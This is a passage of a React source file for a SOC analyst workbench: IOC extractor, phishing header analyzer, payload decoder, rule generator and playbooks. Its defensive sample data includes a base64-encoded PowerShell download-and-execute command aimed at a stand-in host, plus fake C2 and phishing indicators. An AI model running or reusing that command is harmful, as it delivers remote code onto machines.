"use client";

import React, { Suspense, useEffect, useMemo, useState } from "react";
import Link from "next/link";
import { useRouter, useSearchParams } from "next/navigation";
import {
  Wrench,
  Mail,
  Binary,
  Network,
  FileCode2,
  ClipboardCheck,
  Copy,
  Check,
  ArrowUpRight,
  AlertTriangle,
  CheckCircle2,
  Sparkles,
  Shield,
} from "lucide-react";
import {
  SOC_PLAYBOOKS,
  analyzeEmailHeaders,
  decodeCyberPayload,
  defangValue,
  extractSocArtifacts,
  generateDetectionRules,
  inspectSubnetCidr,
  refangText,
} from "@/lib/soc-tools";

type SocToolTab =
  | "extractor"
  | "email-headers"
  | "decoder"
  | "cidr"
  | "siem-query"
  | "playbook";

const SAMPLE_LOG = `2026-11-27T06:15:10Z SRC=45.155.205[.]11 DST=10.20.1.50 PROTO=TCP DPT=443
Callback hxxps://cdn-update.badc2[.]example/stage2.bin
Payload SHA256: 010d16abdf45a544ae192a4eae1c5d11cfa690a827d7e6ba39e457cc774ee26d
Exploit attempt CVE-2026-103406 targeting security@acme-corp[.]com`;

const SAMPLE_HEADERS = `From: Microsoft Security <alert@m1crosoft-support.example>
Return-Path: <bounce@mailer-phish.example>
Reply-To: <verify@harvest-portal.example>
Subject: Urgent: Password Expiration Notice
Date: Fri, 27 Nov 2026 06:10:00 +0000
X-Originating-IP: [185.220.101.4]
Authentication-Results: mx.target.org; spf=fail (sender IP 185.220.101.4 not permitted); dkim=none; dmarc=fail action=quarantine
Received: from mail.mailer-phish.example (185.220.101.4) by mx.target.org with ESMTPS; Fri, 27 Nov 2026 06:10:05 +0000
Received: from desktop-local (10.0.0.15) by mail.mailer-phish.example; Fri, 27 Nov 2026 06:10:01 +0000`;

const SAMPLE_PS_B64 =
  "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBwAGEAeQBsAG8AYQBkACcAKQA=";

function SocWorkbenchContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const urlTool = (searchParams.get("tool") as SocToolTab | null) || "extractor";

  const [activeTool, setActiveTool] = useState<SocToolTab>(urlTool);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // 1. Extractor state
  const [rawLog, setRawLog] = useState(SAMPLE_LOG);
  const [defangOut, setDefangOut] = useState(true);

  // 2. Email Header state
  const [rawHeaders, setRawHeaders] = useState(SAMPLE_HEADERS);

  // 3. Payload Decoder & Hashing state
  const [payloadInput, setPayloadInput] = useState(SAMPLE_PS_B64);
  const [decodeMode, setDecodeMode] = useState<
    "auto" | "base64" | "ps_b64" | "url" | "hex" | "jwt"
  >("auto");
  const [hashInput, setHashInput] = useState("powershell -enc test payload");
  const [computedHashes, setComputedHashes] = useState<{
    sha256: string;
    sha1: string;
    sha512: string;
  } | null>(null);

  // 4. CIDR state
  const [cidrInput, setCidrInput] = useState("45.155.205.11/22");

  // 5. SIEM / Rule state
  const [ruleIocInput, setRuleIocInput] = useState(
    "45.155.205.11\nevil-c2.example.com\n010d16abdf45a544ae192a4eae1c5d11cfa690a827d7e6ba39e457cc774ee26d",
  );
  const [rulePlatform, setRulePlatform] = useState<
    "splunk" | "kql" | "elastic" | "sigma" | "yara"
  >("splunk");

  // 6. Playbook state
  const [playbookId, setPlaybookId] = useState(SOC_PLAYBOOKS[0].id);
  const [checkedSteps, setCheckedSteps] = useState<Record<string, boolean>>({});
  const [ticketNotes, setTicketNotes] = useState("");

  useEffect(() => {
    if (
      [
        "extractor",
        "email-headers",
        "decoder",
        "cidr",
        "siem-query",
        "playbook",
      ].includes(urlTool)
    ) {
      setActiveTool(urlTool);
    }
  }, [urlTool]);

  const switchTool = (next: SocToolTab) => {
    setActiveTool(next);
    router.replace(`/soc-tools?tool=${next}`, { scroll: false });
  };

  const copyValue = async (key: string, val: string) => {
    try {
      await navigator.clipboard.writeText(val);
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 1500);
    } catch {
      // Ignore clipboard failures
    }
  };

  useEffect(() => {
    let cancelled = false;
    async function hashAll() {
      if (typeof crypto === "undefined" || !crypto.subtle) return;
      const bytes = new TextEncoder().encode(hashInput);
      const toHex = (buf: ArrayBuffer) =>
        Array.from(new Uint8Array(buf))
          .map((b) => b.toString(16).padStart(2, "0"))
          .join("");
      const [s256, s1, s512] = await Promise.all([
        crypto.subtle.digest("SHA-256", bytes),
        crypto.subtle.digest("SHA-1", bytes),
        crypto.subtle.digest("SHA-512", bytes),
      ]);
      if (!cancelled) {
        setComputedHashes({
          sha256: toHex(s256),
          sha1: toHex(s1),
          sha512: toHex(s512),
        });
      }
    }
    hashAll();
    return () => {
      cancelled = true;
    };
  }, [hashInput]);

  const extracted = useMemo(() => extractSocArtifacts(rawLog), [rawLog]);
  const headerAnalysis = useMemo(
    () => analyzeEmailHeaders(rawHeaders),
    [rawHeaders],
  );
  const decoded = useMemo(
    () => decodeCyberPayload(payloadInput, decodeMode),
    [payloadInput, decodeMode],
  );
  const subnet = useMemo(() => inspectSubnetCidr(cidrInput), [cidrInput]);
  const generatedRule = useMemo(
    () => generateDetectionRules(ruleIocInput, rulePlatform),
    [ruleIocInput, rulePlatform],
  );

  const activePlaybook =
    SOC_PLAYBOOKS.find((p) => p.id === playbookId) || SOC_PLAYBOOKS[0];

  const allExtractedList = useMemo(() => {
    const raw = [
      ...extracted.ips,
      ...extracted.domains,
      ...extracted.urls,
      ...extracted.hashes.map((h) => h.value),
    ];
    return defangOut ? raw.map((v) => defangValue(v)) : raw;
  }, [extracted, defangOut]);

  const buildPlaybookMarkdown = () => {
    const lines = [
      `## SOC Triage Report: ${activePlaybook.title}`,
      `**Severity:** ${activePlaybook.severity}`,
      `**Date (UTC):** ${new Date().toISOString()}`,
      "",
      "### Checklist Progress",
      ...activePlaybook.steps.map(
        (step, idx) =>
          `- [${checkedSteps[`${activePlaybook.id}-${idx}`] ? "x" : " "}] ${step}`,
      ),
    ];
    if (ticketNotes.trim()) {
      lines.push("", "### Analyst Notes", ticketNotes.trim());
    }
    return lines.join("\n");
  };

  return (
    <div className="space-y-6 w-full">
      {/* Header */}
      <section className="rounded-2xl glass-panel p-5 sm:p-7 space-y-4 shadow-xl">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
          <div className="space-y-1.5">
            <div
              className="inline-flex items-center gap-2 text-[10px] font-bold tracking-widest px-2.5 py-1 rounded-full"
              style={{
                backgroundColor: "var(--accent-soft)",
                border: "1px solid var(--accent-border)",
                color: "var(--accent)",
              }}
            >
              <Wrench className="w-3.5 h-3.5" />
              BLUE TEAM &amp; SOC ANALYST WORKBENCH
            </div>
            <h1 className="text-xl sm:text-2xl lg:text-3xl font-extrabold tracking-tight">
              SOC TRIAGE &amp; INVESTIGATION TOOLKIT
            </h1>
            <p className="text-xs sm:text-sm text-[var(--text-secondary)]">
              ZERO-KEY ANALYST UTILITIES: IOC EXTRACTOR/DEFANGER, PHISHING HEADER ANALYZER, CYBER PAYLOAD DECODER, CIDR CALCULATOR, SIEM/SIGMA/YARA BUILDER &amp; PLAYBOOKS.
            </p>
          </div>

          <div className="flex flex-wrap gap-2">
            <Link
              href="/bulk"
              className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)] text-xs font-bold hover:border-[var(--accent-border)]"
            >
              BULK IOC QUEUE <ArrowUpRight className="w-3.5 h-3.5" />
            </Link>
            <Link
              href="/attacks"
              className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl border border-rose-500/35 bg-rose-500/15 text-rose-300 text-xs font-bold"
            >
              LIVE ATTACK IOCS <ArrowUpRight className="w-3.5 h-3.5" />
            </Link>
          </div>
        </div>
      </section>

      {/* Tool Tabs */}
      <div className="flex items-center gap-1.5 overflow-x-auto no-scrollbar border-b border-[var(--border-subtle)] pb-2">
        {(
          [
            { id: "extractor", label: "IOC EXTRACTOR & DEFANGER", icon: Shield },
            { id: "email-headers", label: "EMAIL HEADER ANALYZER", icon: Mail },
            { id: "decoder", label: "PAYLOAD DECODER & HASH", icon: Binary },
            { id: "cidr", label: "SUBNET / CIDR INSPECTOR", icon: Network },
            { id: "siem-query", label: "SIEM & SIGMA / YARA", icon: FileCode2 },
            { id: "playbook", label: "INCIDENT PLAYBOOKS", icon: ClipboardCheck },
          ] as Array<{
            id: SocToolTab;
            label: string;
            icon: React.ComponentType<{ className?: string }>;
          }>
        ).map((t) => {
          const Icon = t.icon;
          const active = activeTool === t.id;
          return (
            <button
              key={t.id}
              type="button"
              onClick={() => switchTool(t.id)}
              style={
                active
                  ? {
                      backgroundColor: "var(--accent-soft)",
                      borderColor: "var(--accent-border)",
                      color: "var(--accent)",
                    }
                  : undefined
              }
              className={`inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl border text-xs font-bold whitespace-nowrap transition cursor-pointer ${
                active
                  ? ""
                  : "border-[var(--border-subtle)] bg-[var(--bg-surface)] text-[var(--text-secondary)] hover:text-[var(--text-primary)]"
              }`}
            >
              <Icon className="w-3.5 h-3.5" />
              {t.label}
            </button>
          );
        })}
      </div>

      {/* 1. IOC EXTRACTOR & DEFANGER */}
      {activeTool === "extractor" && (
        <div className="grid grid-cols-1 xl:grid-cols-12 gap-5">
          <div className="xl:col-span-5 rounded-2xl glass-panel p-5 space-y-4">
            <div className="flex items-center justify-between gap-2">
              <h2 className="text-sm font-extrabold">
                RAW LOG / TICKET / REPORT INPUT
              </h2>
              <button
                type="button"
                onClick={() => setRawLog(refangText(rawLog))}
                className="text-[10px] font-bold px-2.5 py-1 rounded-lg border border-[var(--border-subtle)] bg-[var(--bg-elevated)] hover:border-[var(--accent-border)] cursor-pointer"
              >
                REFANG INPUT
              </button>
            </div>
            <textarea
              value={rawLog}
              onChange={(e) => setRawLog(e.target.value)}
              rows={12}
              placeholder="Paste SIEM logs, firewall alerts, phishing bodies, or threat feeds..."
              className="w-full p-3.5 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)] font-mono-ioc preserve-case text-xs focus:outline-none focus:border-[var(--accent)]"
            />
            <div className="flex flex-wrap items-center justify-between gap-2 text-xs">
              <label className="inline-flex items-center gap-2 font-bold cursor-pointer">
                <input
                  type="checkbox"
                  checked={defangOut}
                  onChange={(e) => setDefangOut(e.target.checked)}
                />
                DEFANG OUTPUT FOR TICKETS (HXXP / [.])
              </label>

              <button
                type="button"
                onClick={() => copyValue("all-ext", allExtractedList.join("\n"))}
                style={{ backgroundColor: "var(--accent)" }}
                className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-white text-xs font-bold cursor-pointer"
              >
                {copiedKey === "all-ext" ? (
                  <Check className="w-3.5 h-3.5" />
                ) : (
                  <Copy className="w-3.5 h-3.5" />
                )}
                COPY ALL ({allExtractedList.length})
              </button>
            </div>
          </div>

          <div className="xl:col-span-7 rounded-2xl glass-panel p-5 space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <h2 className="text-sm font-extrabold">EXTRACTED INDICATORS</h2>
              <button
                type="button"
                onClick={() => {
                  setRuleIocInput(allExtractedList.map(refangText).join("\n"));
                  switchTool("siem-query");
                }}
                style={{ color: "var(--accent)" }}
                className="text-xs font-bold hover:underline cursor-pointer"
              >
                SEND TO SIEM / SIGMA GENERATOR →
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
              {[
                { label: "IP ADDRESSES", items: extracted.ips, pivot: true },
                { label: "DOMAINS", items: extracted.domains, pivot: true },
                { label: "URLS", items: extracted.urls, pivot: true },
                {
                  label: "FILE HASHES",
                  items: extracted.hashes.map((h) => h.value),
                  pivot: true,
                },
                { label: "EMAILS", items: extracted.emails, pivot: false },
                { label: "CVES", items: extracted.cves, pivot: false },
              ].map((grp) => (
                <div
                  key={grp.label}
                  className="p-3.5 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)]/45 space-y-2"
                >
                  <div className="text-[10px] font-bold text-[var(--text-secondary)]">
                    {grp.label} ({grp.items.length})
                  </div>
                  {grp.items.length === 0 ? (
                    <p className="text-[11px] text-[var(--text-secondary)]">NONE</p>
                  ) : (
                    <div className="space-y-1 max-h-40 overflow-y-auto">
                      {grp.items.map((val) => {
                        const shown = defangOut ? defangValue(val) : val;
                        return (
                          <div
                            key={val}
                            className="flex items-center justify-between gap-2 py-1 border-b border-[var(--border-subtle)]/40"
                          >
                            <span className="font-mono-ioc preserve-case truncate">
                              {shown}
                            </span>
                            {grp.pivot ? (
                              <Link
                                href={`/?ioc=${encodeURIComponent(val)}`}
                                style={{ color: "var(--accent)" }}
                                className="text-[10px] font-bold shrink-0 hover:underline"
                              >
                                LOOKUP →
                              </Link>
                            ) : grp.label === "CVES" ? (
                              <Link
                                href={`/cve?tab=search&q=${encodeURIComponent(val)}`}
                                className="text-[10px] font-bold text-rose-300 shrink-0 hover:underline"
                              >
                                CVE →
                              </Link>
                            ) : (
                              <Link
                                href={`/darkweb?tab=credentials`}
                                className="text-[10px] font-bold text-amber-300 shrink-0 hover:underline"
                              >
                                LEAKS →
                              </Link>
                            )}
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 2. EMAIL HEADER PHISHING ANALYZER */}
      {activeTool === "email-headers" && (
        <div className="grid grid-cols-1 xl:grid-cols-12 gap-5">
          <div className="xl:col-span-5 rounded-2xl glass-panel p-5 space-y-3">
            <h2 className="text-sm font-extrabold">RAW SMTP / EML HEADERS</h2>
            <textarea
              value={rawHeaders}
              onChange={(e) => setRawHeaders(e.target.value)}
              rows={15}
              placeholder="Paste raw email headers (From, Return-Path, Authentication-Results, Received...)..."
              className="w-full p-3.5 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)] font-mono-ioc preserve-case text-xs focus:outline-none focus:border-[var(--accent)]"
            />
          </div>

          <div className="xl:col-span-7 space-y-4">
            <div className="rounded-2xl glass-panel p-5 space-y-4">
              <div className="grid grid-cols-3 gap-3">
                {headerAnalysis.authVerdicts.map((v) => {
                  const ok = v.status === "PASS" || v.status === "BESTGUESSPASS";
                  const bad = v.status === "FAIL" || v.status === "SOFTFAIL";
                  return (
                    <div
                      key={v.mechanism}
                      className={`p-3.5 rounded-xl border ${
                        ok
                          ? "border-emerald-500/35 bg-emerald-500/10"
                          : bad
                            ? "border-rose-500/35 bg-rose-500/10"
                            : "border-[var(--border-subtle)] bg-[var(--bg-elevated)]/55"
                      }`}
                    >
                      <div className="text-[10px] font-bold text-[var(--text-secondary)]">
                        {v.mechanism} AUTH
                      </div>
                      <div
                        className={`text-base font-extrabold font-mono-ioc mt-1 flex items-center gap-1.5 ${
                          ok
                            ? "text-emerald-300"
                            : bad
                              ? "text-rose-300"
                              : "text-amber-300"
                        }`}
                      >
                        {ok ? (
                          <CheckCircle2 className="w-4 h-4" />
                        ) : (
                          <AlertTriangle className="w-4 h-4" />
                        )}
                        {v.status}
                      </div>
                    </div>
                  );
                })}
              </div>

              {headerAnalysis.anomalies.length > 0 && (
                <div className="p-4 rounded-xl border border-rose-500/35 bg-rose-500/10 space-y-1.5 text-xs">
                  <div className="text-[10px] font-extrabold text-rose-300">
                    SPOOFING / AUTHENTICATION ANOMALIES DETECTED
                  </div>
                  {headerAnalysis.anomalies.map((a) => (
                    <div key={a} className="preserve-case text-rose-200">
                      • {a}
                    </div>
                  ))}
                </div>
              )}

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
                <div className="p-3.5 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)]/45 space-y-1.5 preserve-case">
                  <div>
                    <strong>FROM:</strong> {headerAnalysis.from || "—"}
                  </div>
                  <div>
                    <strong>RETURN-PATH:</strong>{" "}
                    {headerAnalysis.returnPath || "—"}
                  </div>
                  <div>
                    <strong>REPLY-TO:</strong> {headerAnalysis.replyTo || "—"}
                  </div>
                  <div>
                    <strong>SUBJECT:</strong> {headerAnalysis.subject || "—"}
                  </div>
                </div>

                <div className="p-3.5 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)]/45 space-y-2">
                  <div className="text-[10px] font-bold text-[var(--text-secondary)]">
                    PUBLIC SENDER / RELAY IPS ({headerAnalysis.extractedIps.length})
                  </div>
                  <div className="flex flex-wrap gap-1.5">
                    {headerAnalysis.extractedIps.map((ip) => (
                      <Link
                        key={ip}
                        href={`/?ioc=${encodeURIComponent(ip)}`}
                        className="px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] border border-[var(--accent-border)] font-mono-ioc text-xs font-bold hover:underline"
                        style={{ color: "var(--accent)" }}
                      >
                        {ip} ↗
                      </Link>
                    ))}
                  </div>
                </div>
              </div>

              {headerAnalysis.hops.length > 0 && (
                <div className="space-y-2">
                  <div className="text-[10px] font-bold text-[var(--text-secondary)]">
                    SMTP RELAY HOP TRACE (OLDEST → NEWEST)
                  </div>
                  <div className="space-y-1.5">
                    {headerAnalysis.hops.map((h) => (
                      <div
                        key={h.hop}
                        className="p-2.5 rounded-lg border border-[var(--border-subtle)] bg-[var(--bg-elevated)]/40 text-xs flex flex-wrap items-center justify-between gap-2"
                      >
                        <div className="font-mono-ioc preserve-case">
                          <span className="font-bold text-amber-300 mr-2">
                            HOP #{h.hop}
                          </span>
                          {h.fromHost || "?"} → {h.byHost || "?"}
                        </div>
                        <span className="font-mono-ioc text-[10px] text-[var(--text-secondary)]">
                          {h.timestamp || "—"}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* 3. CYBER PAYLOAD DECODER & HASH CALCULATOR */}
      {activeTool === "decoder" && (
        <div className="grid grid-cols-1 xl:grid-cols-12 gap-5">
          <div className="xl:col-span-7 rounded-2xl glass-panel p-5 space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div>
                <h2 className="text-sm font-extrabold">
                  MULTI-FORMAT PAYLOAD DECODER (STATIC SAFE)
                </h2>
                <p className="text-[11px] text-[var(--text-secondary)]">
                  AUTO-DETECTS POWERSHELL -ENCODEDCOMMAND (UTF-16LE), BASE64, HEX, URL &amp; JWT TOKENS
                </p>
              </div>
              <select
                value={decodeMode}
                onChange={(e) =>
                  setDecodeMode(
                    e.target.value as
                      | "auto"
                      | "base64"
                      | "ps_b64"
                      | "url"
                      | "hex"
                      | "jwt",
                  )
                }
                className="px-3 py-1.5 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)] text-xs font-bold"
              >
                <option value="auto">AUTO DETECT</option>
                <option value="base64">BASE64 (UTF-8)</option>
                <option value="ps_b64">POWERSHELL UTF-16LE</option>
                <option value="url">URL DECODE</option>
                <option value="hex">HEX -&gt; TEXT</option>
                <option value="jwt">JWT INSPECTOR</option>
              </select>
            </div>

            <textarea
              value={payloadInput}
              onChange={(e) => setPayloadInput(e.target.value)}
              rows={5}
              className="w-full p-3.5 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)] font-mono-ioc preserve-case text-xs"
            />

            <div className="p-4 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-surface)] space-y-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span
                  className="text-[10px] font-extrabold px-2 py-0.5 rounded"
                  style={{
                    backgroundColor: "var(--accent-soft)",
                    color: "var(--accent)",
                  }}
                >
                  {decoded.detectedMode}
                </span>
                <button
                  type="button"
                  onClick={() => copyValue("decoded", decoded.decodedText)}
                  className="text-[10px] font-bold px-2.5 py-1 rounded border border-[var(--border-subtle)] bg-[var(--bg-elevated)] cursor-pointer"
                >
                  {copiedKey === "decoded" ? "COPIED" : "COPY OUTPUT"}
                </button>
              </div>
              {decoded.secondaryNote && (
                <div className="text-[10px] font-mono-ioc text-amber-300">
                  {decoded.secondaryNote}
                </div>
              )}
              <pre className="text-xs font-mono-ioc preserve-case whitespace-pre-wrap break-all text-emerald-300">
                {decoded.decodedText}
              </pre>
            </div>
          </div>

          <div className="xl:col-span-5 rounded-2xl glass-panel p-5 space-y-4">
            <div>
              <h2 className="text-sm font-extrabold">
                LIVE CRYPTOGRAPHIC HASH GENERATOR
              </h2>
              <p className="text-[11px] text-[var(--text-secondary)]">
                COMPUTE SHA-256 / SHA-1 / SHA-512 &amp; PIVOT STRAIGHT TO VIRUSTOTAL / MALWAREBAZAAR
              </p>
            </div>

            <textarea
              value={hashInput}
              onChange={(e) => setHashInput(e.target.value)}
              rows={4}
              placeholder="Paste string, script, or command line to hash..."
              className="w-full p-3 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)] font-mono-ioc preserve-case text-xs"
            />

            {computedHashes && (
              <div className="space-y-2.5 text-xs">
                {(
                  [
                    { label: "SHA-256", val: computedHashes.sha256, lookup: true },
                    { label: "SHA-1", val: computedHashes.sha1, lookup: true },
                    { label: "SHA-512", val: computedHashes.sha512, lookup: false },
                  ] as const
                ).map((h) => (
                  <div
                    key={h.label}
                    className="p-3 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)]/45 space-y-1"
                  >
                    <div className="flex items-center justify-between gap-2">
                      <span className="text-[10px] font-bold text-[var(--text-secondary)]">
                        {h.label}
                      </span>
                      <div className="flex items-center gap-2">
                        <button
                          type="button"
                          onClick={() => copyValue(h.label, h.val)}
                          className="text-[10px] font-bold hover:underline cursor-pointer"
                        >
                          {copiedKey === h.label ? "COPIED" : "COPY"}
                        </button>
                        {h.lookup && (
                          <Link
                            href={`/?ioc=${encodeURIComponent(h.val)}`}
                            style={{ color: "var(--accent)" }}
                            className="text-[10px] font-bold hover:underline"
                          >
                            IOC LOOKUP →
                          </Link>
                        )}
                      </div>
                    </div>
                    <code className="block font-mono-ioc preserve-case text-[11px] break-all">
                      {h.val}
                    </code>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* 4. SUBNET / CIDR INSPECTOR */}
      {activeTool === "cidr" && (
        <div className="rounded-2xl glass-panel p-5 space-y-5">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <h2 className="text-sm font-extrabold">
                IPV4 SUBNET &amp; CIDR BLOCK CALCULATOR
              </h2>
              <p className="text-[11px] text-[var(--text-secondary)]">
                VERIFY FIREWALL CIDRS, INTERNAL RFC1918 RANGES, BROADCAST &amp; ACL WILDCARD MASKS
              </p>
            </div>
            <input
              type="text"
              value={cidrInput}
              onChange={(e) => setCidrInput(e.target.value)}
              placeholder="e.g. 192.168.10.0/24"
              className="px-4 py-2.5 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)] font-mono-ioc text-sm"
            />
          </div>

          {!subnet ? (
            <div className="p-6 rounded-xl border border-rose-500/35 bg-rose-500/10 text-rose-300 text-xs font-bold">
              INVALID IPV4 CIDR FORMAT. USE FORMAT LIKE 45.155.205.11/22 OR 10.0.0.0/8.
            </div>
          ) : (
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs">
              {[
                { k: "CANONICAL CIDR", v: subnet.cidr },
                { k: "SCOPE / CLASS", v: subnet.classification },
                { k: "NETWORK ADDRESS", v: subnet.networkAddress },
                { k: "BROADCAST ADDRESS", v: subnet.broadcastAddress },
                { k: "SUBNET MASK", v: subnet.netmask },
                { k: "ACL WILDCARD MASK", v: subnet.wildcardMask },
                {
                  k: "USABLE HOST RANGE",
                  v: `${subnet.firstUsable} – ${subnet.lastUsable}`,
                },
                {
                  k: "USABLE / TOTAL HOSTS",
                  v: `${subnet.usableHosts.toLocaleString()} / ${subnet.totalAddresses.toLocaleString()}`,
                },
              ].map((cell) => (
                <div
                  key={cell.k}
                  className="p-4 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)]/55 space-y-1"
                >
                  <div className="text-[10px] font-bold text-[var(--text-secondary)]">
                    {cell.k}
                  </div>
                  <div className="font-mono-ioc font-extrabold text-sm break-all">
                    {cell.v}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* 5. SIEM & DETECTION RULE GENERATOR */}
      {activeTool === "siem-query" && (
        <div className="grid grid-cols-1 xl:grid-cols-12 gap-5">
          <div className="xl:col-span-5 rounded-2xl glass-panel p-5 space-y-3">
            <h2 className="text-sm font-extrabold">
              HUNTING INDICATORS (IPS, DOMAINS, HASHES)
            </h2>
            <textarea
              value={ruleIocInput}
              onChange={(e) => setRuleIocInput(e.target.value)}
              rows={10}
              className="w-full p-3.5 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)] font-mono-ioc preserve-case text-xs"
            />
          </div>

          <div className="xl:col-span-7 rounded-2xl glass-panel p-5 space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div className="flex flex-wrap gap-1.5">
                {(
                  [
                    { id: "splunk", label: "SPLUNK SPL" },
                    { id: "kql", label: "SENTINEL / MDE KQL" },
                    { id: "elastic", label: "ELASTIC KQL" },
                    { id: "sigma", label: "SIGMA YAML" },
                    { id: "yara", label: "YARA RULE" },
                  ] as const
                ).map((p) => (
                  <button
                    key={p.id}
                    type="button"
                    onClick={() => setRulePlatform(p.id)}
                    style={
                      rulePlatform === p.id
                        ? {
                            backgroundColor: "var(--accent-soft)",
                            borderColor: "var(--accent-border)",
                            color: "var(--accent)",
                          }
                        : undefined
                    }
                    className={`px-3 py-1.5 rounded-lg border text-xs font-bold cursor-pointer ${
                      rulePlatform === p.id
                        ? ""
                        : "border-[var(--border-subtle)] bg-[var(--bg-elevated)] text-[var(--text-secondary)]"
                    }`}
                  >
                    {p.label}
                  </button>
                ))}
              </div>

              <button
                type="button"
                onClick={() => copyValue("rule", generatedRule)}
                style={{ backgroundColor: "var(--accent)" }}
                className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl text-white text-xs font-bold cursor-pointer"
              >
                {copiedKey === "rule" ? (
                  <Check className="w-3.5 h-3.5" />
                ) : (
                  <Copy className="w-3.5 h-3.5" />
                )}
                COPY QUERY / RULE
              </button>
            </div>

            <pre className="p-4 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-surface)] font-mono-ioc preserve-case text-xs whitespace-pre-wrap overflow-x-auto text-emerald-300">
              {generatedRule}
            </pre>
          </div>
        </div>
      )}

      {/* 6. SOC INCIDENT TRIAGE PLAYBOOKS */}
      {activeTool === "playbook" && (
        <div className="grid grid-cols-1 xl:grid-cols-12 gap-5">
          <div className="xl:col-span-4 space-y-2.5">
            {SOC_PLAYBOOKS.map((pb) => {
              const selected = pb.id === playbookId;
              return (
                <button
                  key={pb.id}
                  type="button"
                  onClick={() => setPlaybookId(pb.id)}
                  style={
                    selected
                      ? {
                          backgroundColor: "var(--accent-soft)",
                          borderColor: "var(--accent-border)",
                        }
                      : undefined
                  }
                  className={`w-full text-left p-4 rounded-2xl border transition cursor-pointer space-y-1 ${
                    selected
                      ? ""
                      : "border-[var(--border-subtle)] bg-[var(--bg-surface)] hover:border-[var(--accent-border)]"
                  }`}
                >
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-xs font-extrabold">{pb.title}</span>
                    <span
                      className={`text-[9px] font-bold px-2 py-0.5 rounded-full ${
                        pb.severity === "CRITICAL"
                          ? "bg-rose-500/20 text-rose-300"
                          : "bg-amber-500/20 text-amber-300"
                      }`}
                    >
                      {pb.severity}
                    </span>
                  </div>
                  <p className="text-[11px] text-[var(--text-secondary)] preserve-case">
                    {pb.summary}
                  </p>
                </button>
              );
            })}
          </div>

          <div className="xl:col-span-8 rounded-2xl glass-panel p-5 space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div>
                <h2 className="text-sm font-extrabold flex items-center gap-1.5">
                  <Sparkles
                    className="w-4 h-4"
                    style={{ color: "var(--accent)" }}
                  />
                  {activePlaybook.title}
                </h2>
                <p className="text-[11px] text-[var(--text-secondary)] preserve-case">
                  {activePlaybook.summary}
                </p>
              </div>
              <button
                type="button"
                onClick={() => copyValue("pb-md", buildPlaybookMarkdown())}
                style={{ backgroundColor: "var(--accent)" }}
                className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-white text-xs font-bold cursor-pointer"
              >
                {copiedKey === "pb-md" ? (
                  <Check className="w-3.5 h-3.5" />
                ) : (
                  <Copy className="w-3.5 h-3.5" />
                )}
                COPY MARKDOWN REPORT
              </button>
            </div>

            <div className="space-y-2">
              {activePlaybook.steps.map((step, idx) => {
                const key = `${activePlaybook.id}-${idx}`;
                const done = Boolean(checkedSteps[key]);
                return (
                  <label
                    key={key}
                    className={`flex items-start gap-3 p-3.5 rounded-xl border cursor-pointer text-xs preserve-case ${
                      done
                        ? "border-emerald-500/35 bg-emerald-500/10"
                        : "border-[var(--border-subtle)] bg-[var(--bg-elevated)]/45"
                    }`}
                  >
                    <input
                      type="checkbox"
                      checked={done}
                      onChange={(e) =>
                        setCheckedSteps((prev) => ({
                          ...prev,
                          [key]: e.target.checked,
                        }))
                      }
                      className="mt-0.5"
                    />
                    <span className={done ? "line-through opacity-80" : ""}>
                      {idx + 1}. {step}
                    </span>
                  </label>
                );
              })}
            </div>

            <div className="space-y-1.5">
              <div className="text-[10px] font-bold text-[var(--text-secondary)]">
                ANALYST TRIAGE NOTES (INCLUDED IN MARKDOWN EXPORT)
              </div>
              <textarea
                value={ticketNotes}
                onChange={(e) => setTicketNotes(e.target.value)}
                rows={3}
                placeholder="Hostnames isolated, IOCs blocked, containment verification..."
                className="w-full p-3 rounded-xl border border-[var(--border-subtle)] bg-[var(--bg-elevated)] text-xs preserve-case"
              />
            </div>
          </div>
        </div>
      )}
